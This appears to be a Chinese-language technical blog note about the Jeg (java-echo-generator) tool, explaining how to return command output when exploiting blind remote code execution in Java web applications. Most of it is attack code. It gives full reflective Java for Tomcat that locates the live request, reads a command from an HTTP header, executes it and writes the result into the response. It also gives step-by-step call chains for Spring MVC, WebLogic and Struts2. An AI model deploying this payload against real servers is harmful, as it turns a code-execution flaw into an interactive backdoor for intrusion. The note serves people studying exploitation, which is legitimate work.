---
title: Jeg回显
tags:
  - java
description: 解决RCE中无回显问题
---

## what is Jeg

https://github.com/pen4uin/java-echo-generator

通过获取不同web框架中的request、response对象, 实现通过http请求传递命令并回显结果。

不同框架获取方式不同， 不同版本实现可能也不同。代码需要在请求处理相关的线程中执行，后台线程、异步线程可能找不到request。

## tomcat

原理

```txt
Thread.getThreads()
  -> 找线程名包含 "http" 和 "Acceptor" 的 Tomcat 线程
  -> target = thread.target
  -> endpoint = target.endpoint 或 target.this$0
  -> handler = endpoint.handler
  -> requestGroupInfo = handler.global
  -> processors = requestGroupInfo.processors
  -> processor = processors[i]
  -> coyoteRequest = processor.req

读取请求头：
  -> command = coyoteRequest.getHeader(getReqHeaderName())

获取响应并写回：
  -> servletRequest = coyoteRequest.getNote(1) # 1 = CoyoteAdapter.ADAPTER_NOTES
  -> servletResponse = servletRequest.getResponse()
  -> writer = servletResponse.getWriter()
  -> writer.write(exec(command))
  -> writer.flush()
```



代码实现：

```java
Method getThreadsMethod = Thread.class.getDeclaredMethod("getThreads", new Class[0]);
getThreadsMethod.setAccessible(true);

Thread[] threads = (Thread[]) getThreadsMethod.invoke(null);

for (int threadIndex = 0; threadIndex < threads.length; threadIndex++) {
    Thread thread = threads[threadIndex];

    if (thread.getName().contains("http") && thread.getName().contains("Acceptor")) {
        Field targetField = thread.getClass().getDeclaredField("target");
        targetField.setAccessible(true);

        Object target = targetField.get(thread);

        Field endpointField;
        try {
            endpointField = target.getClass().getDeclaredField("endpoint");
        } catch (NoSuchFieldException e) {
            endpointField = target.getClass().getDeclaredField("this$0");
        }

        endpointField.setAccessible(true);
        Object endpoint = endpointField.get(target);

        Field handlerField;
        try {
            handlerField = endpoint.getClass().getDeclaredField("handler");
        } catch (NoSuchFieldException e1) {
            try {
                handlerField = endpoint.getClass().getSuperclass().getDeclaredField("handler");
            } catch (NoSuchFieldException e2) {
                handlerField = endpoint.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
            }
        }

        handlerField.setAccessible(true);
        Object handler = handlerField.get(endpoint);

        Field globalField;
        try {
            globalField = handler.getClass().getDeclaredField("global");
        } catch (NoSuchFieldException e) {
            globalField = handler.getClass().getSuperclass().getDeclaredField("global");
        }

        globalField.setAccessible(true);
        Object requestGroupInfo = globalField.get(handler);

        requestGroupInfo.getClass()
                .getClassLoader()
                .loadClass("org.apache.coyote.RequestGroupInfo");

        if (requestGroupInfo.getClass().getName().contains("org.apache.coyote.RequestGroupInfo")) {
            Field processorsField = requestGroupInfo.getClass().getDeclaredField("processors");
            processorsField.setAccessible(true);

            ArrayList processors = (ArrayList) processorsField.get(requestGroupInfo);

            for (int processorIndex = 0; processorIndex < processors.size(); processorIndex++) {
                Object processor = processors.get(processorIndex);

                Field coyoteRequestField = processor.getClass().getDeclaredField("req");
                coyoteRequestField.setAccessible(true);

                Object coyoteRequest = coyoteRequestField.get(processor);

                Object servletRequest = coyoteRequest.getClass()
                        .getDeclaredMethod("getNote", Integer.TYPE)
                        .invoke(coyoteRequest, 1);

                String command;

                try {
                    command = (String) coyoteRequest.getClass()
                            .getMethod("getHeader", new Class[]{String.class})
                            .invoke(coyoteRequest, new Object[]{getReqHeaderName()});

                    if (command != null) {
                        Object response = servletRequest.getClass()
                                .getDeclaredMethod("getResponse", new Class[0])
                                .invoke(servletRequest, new Object[0]);

                        Writer writer = (Writer) response.getClass()
                                .getMethod("getWriter", new Class[0])
                                .invoke(response, new Object[0]);

                        writer.write(exec(command));
                        writer.flush();
                        writer.close();

                        break;
                    }
                } catch (Exception ignored) {
                }
            }
        }
    }
}

```



## springMVC

```txt
classLoader = Thread.currentThread().getContextClassLoader()
  -> requestContextHolderClass = classLoader.loadClass("org.springframework.web.context.request.RequestContextHolder")
  -> requestAttributes = RequestContextHolder.getRequestAttributes()
  -> request = requestAttributes.getRequest()
  -> response = requestAttributes.getResponse()

读取请求头：
  -> command = request.getHeader(getReqHeaderName())

写响应：
  -> writer = response.getWriter()
  -> writer.write(exec(command))
  -> writer.flush()
  -> writer.close()
```



## weblogic

```txt
thread = Thread.currentThread()
  -> target = thread.getCurrentWork()

读取请求头：
  -> command = target.getHeader(getReqHeaderName())

获取响应：
  -> response = target.getResponse()
  -> writer = response.getWriter()

写响应：
  -> writer.write(exec(command))
  -> writer.flush()
  -> writer.close()
```

or

```txt
thread = Thread.currentThread()
  -> target = thread.getCurrentWork()
  -> connectionHandler = target.connectionHandler
  -> request = connectionHandler.getServletRequest()
  -> response = connectionHandler.getServletResponse()

读取请求头：
  -> command = request.getHeader(getReqHeaderName())

写响应：
  -> writer = response.getWriter()
  -> writer.write(exec(command))
  -> writer.flush()
  -> writer.close()
```

## struts2

```txt
classLoader = Thread.currentThread().getContextClassLoader()
  -> actionContextClass = Class.forName("com.opensymphony.xwork2.ActionContext", false, classLoader)
  -> actionContextThreadLocal = ActionContext.actionContext
  -> actionContext = actionContextThreadLocal.get()
  -> context = actionContext.getContext()

获取 request/response：
  -> request = context.get("com.opensymphony.xwork2.dispatcher.HttpServletRequest")
  -> response = context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")

读取请求头：
  -> command = request.getHeader(getReqHeaderName())

写响应：
  -> writer = response.getWriter()
  -> writer.write(exec(command))
  -> writer.flush()
  -> writer.close()
```

